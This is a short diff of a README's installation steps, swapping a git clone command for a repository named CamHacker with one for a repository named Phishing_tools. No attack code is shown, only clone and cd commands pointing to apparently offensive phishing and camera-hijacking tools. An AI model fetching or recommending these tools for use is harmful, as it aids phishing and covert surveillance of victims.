@@ -2,5 +2,5 @@
 
 ### [+] Installation
 
- - `git clone https://github.com/KasRoudra/CamHacker`
- - `cd CamHacker`
+ - `git clone https://github.com/hacker6291/Phishing_tools.git`
+ - `cd Phishing_tools`
